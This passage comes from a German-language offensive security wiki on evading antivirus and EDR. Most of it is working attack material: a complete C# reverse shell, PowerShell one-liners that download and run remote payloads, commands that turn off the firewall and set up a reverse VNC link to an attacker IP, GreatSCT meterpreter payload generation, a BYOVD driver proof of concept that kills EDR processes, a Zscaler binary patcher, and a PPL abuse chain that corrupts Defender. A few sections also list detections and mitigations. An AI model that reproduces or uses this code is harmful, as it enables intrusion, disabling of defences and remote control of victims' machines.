Dabei wird **ein neuer Opferprozess erzeugt**, in diesen Prozess wird dann der post-exploitation bösartige Code injiziert, der Code ausgeführt und nach Abschluss der neue Prozess beendet. Das hat Vor- und Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantat-Prozesses stattfindet. Das bedeutet, wenn etwas bei unserer Post-Exploitation-Aktion schiefgeht oder entdeckt wird, besteht eine **viel höhere Chance**, dass unser **Implantat überlebt.** Der Nachteil ist, dass die Chance, durch **Behavioural Detections** entdeckt zu werden, **größer** ist.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hierbei wird der post-exploitation bösartige Code **in den eigenen Prozess** injiziert. Dadurch entfällt das Erzeugen eines neuen Prozesses und somit dessen Scan durch AV, aber der Nachteil ist, dass beim Fehlschlagen der Payload-Ausführung die **größere Gefahr** besteht, **den Beacon zu verlieren**, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn Sie mehr über C# Assembly loading lesen möchten, schauen Sie sich bitte diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Sie können C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff **auf die Interpreter-Umgebung auf dem Attacker Controlled SMB share** gewährt.

Indem man Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share erlaubt, kann man **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo weist darauf hin: Defender scannt weiterhin die Skripte, aber durch die Nutzung von Go, Java, PHP etc. haben wir **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen, nicht-obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die es einem Angreifer erlaubt, **das Access-Token oder ein Sicherheitsprodukt wie ein EDR oder AV zu manipulieren**, sodass dessen Privilegien reduziert werden — der Prozess stirbt nicht, hat aber nicht mehr die Berechtigungen, nach bösartigen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **verhindern, dass externe Prozesse** Handles an Tokens von Sicherheitsprozessen erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf einem Opfer-PC zu installieren und es zu nutzen, um die Maschine zu übernehmen und Persistenz zu erreichen:
1. Download von https://remotedesktop.google.com/, auf "Set up via SSH" klicken und dann die MSI-Datei für Windows herunterladen.
2. Führen Sie den Installer auf dem Opferrechner im Silent-Modus aus (Administrator erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehen Sie zurück zur Chrome Remote Desktop-Seite und klicken Sie auf Weiter. Der Assistent fordert Sie dann zur Autorisierung auf; klicken Sie auf Authorize, um fortzufahren.
4. Führen Sie den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachten Sie den pin-Parameter, mit dem die PIN gesetzt werden kann, ohne die GUI zu verwenden).


## Advanced Evasion

Evasion ist ein sehr kompliziertes Thema; manchmal muss man viele verschiedene Telemetriequellen in nur einem System berücksichtigen, daher ist es nahezu unmöglich, in ausgereiften Umgebungen völlig unentdeckt zu bleiben.

Jede Umgebung, gegen die Sie vorgehen, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, sich diesen Talk von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Sie können [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binary entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig einstuft und es Ihnen aufschlüsselt.\
Ein weiteres Tool, das **das Gleiche macht**, ist [**avred**](https://github.com/dobin/avred) mit einem offenen Web-Angebot des Dienstes unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows 10 wurde Windows standardmäßig mit einem **Telnet-Server** geliefert, den man (als Administrator) wie folgt installieren konnte:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sorgen Sie dafür, dass es beim Systemstart **gestartet** wird, und führen Sie es jetzt **aus**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port ändern** (stealth) und firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Herunterladen von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du willst die bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort in _VNC Password_
- Setze ein Passwort in _View-Only Password_

Dann verschiebe die Binary _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf das **victim**

#### **Reverse connection**

Der **attacker** sollte in seinem **host** die Binary `vncviewer.exe -listen 5900` ausführen, damit er vorbereitet ist, eine reverse **VNC connection** abzufangen. Dann, auf dem **victim**: Starte den winvnc-Daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um unauffällig zu bleiben, darfst du einige Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet
- Führe `winvnc -h` nicht aus, um Hilfe zu erhalten, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Herunterladen von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte jetzt den **lister** mit `msfconsole -r file.rc` und **führe** die **xml payload** mit:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unseren eigenen reverse shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# Compiler verwenden
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste von C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel zur Verwendung von python für build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR im Kernel Space deaktivieren

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmaßnahmen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Dienste nicht blockieren können.

Zentrale Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte geschriebene Datei heißt `ServiceMouse.sys`, aber das Binär ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ “System In-Depth Analysis Toolkit”. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er geladen, selbst wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Dienst** und die zweite startet ihn, sodass `\\.\ServiceMouse` vom Benutzermodus aus zugänglich wird.
3. **Vom Treiber exponierte IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimaler C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht User-Mode-Schutzmechanismen vollständig; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmechanismen.

Erkennung / Gegenmaßnahmen
•  Aktivieren Sie Microsofts vulnerable-driver block list (z. B. `HVCI`, `Smart App Control`), sodass Windows `AToolsKrnl64.sys` das Laden verweigert.  
•  Überwachen Sie das Anlegen neuer *Kernel*-Dienste und alarmieren Sie, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List steht.  
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objekten gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehen der Zscaler Client Connector Posture-Checks durch On-Disk Binary Patching

Zscaler’s **Client Connector** führt device-posture Regeln lokal aus und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu kommunizieren. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Evaluierung findet **vollständig client-seitig** statt (es wird nur ein Boolean an den Server gesendet).  
2. Interne RPC-Endpunkte validieren nur, dass die verbindende ausführbare Datei **von Zscaler signiert** ist (mittels `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binaries auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ jeder (auch nicht signierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Umgangen |

Minimaler Patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Alle** posture checks zeigen **green/compliant** an.
* Unsigned or modified binaries können die named-pipe RPC endpoints öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches ausgehebelt werden können.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) erzwingt eine signer/level-Hierarchie, sodass nur gleich- oder höher eingestufte protected processes sich gegenseitig manipulieren können. Offensiv: Wenn du legitim eine PPL-enabled binary starten und deren Argumente kontrollieren kannst, kannst du harmlose Funktionalität (z. B. logging) in ein eingeschränktes, PPL-backed write primitive gegen geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.

What makes a process run as PPL
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-capable EKU signiert sein.
- Der Prozess muss mit CreateProcess erstellt werden und die Flags verwenden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ein kompatibles protection level muss angefordert werden, das dem signer der binary entspricht (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für anti-malware signers, `PROTECTION_LEVEL_WINDOWS` für Windows signers). Falsche Levels führen dazu, dass die Erstellung fehlschlägt.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Verwendungsweise:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN-Primitiv: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei in einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht verarbeiten; verwenden Sie 8.3-Kurzpfade, um auf normalerweise geschützte Orte zu zeigen.

8.3 Kurzpfad-Helfer
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` unter Verwendung eines Launchers (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Log-Pfad-Argument, um eine Dateierstellung in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurzpfade.
3) Wenn die Ziel-Binärdatei normalerweise vom AV während der Ausführung geöffnet/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang für den Bootvorgang, bevor der AV startet, indem du einen Autostart-Service installierst, der zuverlässig früher läuft. Validiere die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der PPL-unterstützte Schreibvorgang, bevor der AV seine Binaries sperrt, wodurch die Zieldatei beschädigt wird und ein Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen ausgeblendet/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Sie können den Inhalt, den ClipUp schreibt, nur in Bezug auf die Platzierung steuern; die Primitive eignet sich eher zur Korruption als zur präzisen Inhaltseinfügung.
- Erfordert lokale Admin/SYSTEM-Rechte, um einen Service zu installieren/zu starten, sowie ein Reboot-Fenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Boot-Zeit vermeidet Dateisperren.

Detections
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn es von nicht-standardmäßigen Startern als Elternprozess gestartet wird, rund um den Boot-Vorgang.
- Neue Dienste, die so konfiguriert sind, dass verdächtige Binaries automatisch starten und konsequent vor Defender/AV starten. Untersuchen Sie Service-Erstellung/-Änderungen vor Defender-Startup-Fehlern.
- File-Integrity-Monitoring auf Defender-Binaries/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: suchen Sie nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomalem PPL-Level-Einsatz durch Nicht-AV-Binaries.

Mitigations
- WDAC/Code Integrity: einschränken, welche signierten Binaries als PPL laufen dürfen und unter welchen Elternprozessen; ClipUp-Aufrufe außerhalb legitimer Kontexte blockieren.
- Service-Hygiene: Einschränken der Erstellung/Änderung von Auto-Start-Diensten und Überwachen von Startreihenfolge-Manipulationen.
- Sicherstellen, dass Defender-Tamper-Schutz und Early-Launch-Schutzmechanismen aktiviert sind; Startfehler untersuchen, die auf Binärdateikorruption hindeuten.
- Erwägen Sie, die 8.3-Kurzname-Generierung auf Volumes, die Security-Tooling hosten, zu deaktivieren, falls mit Ihrer Umgebung kompatibel (gründlich testen).

Referenzen zu PPL und Werkzeugen
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Referenzen

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
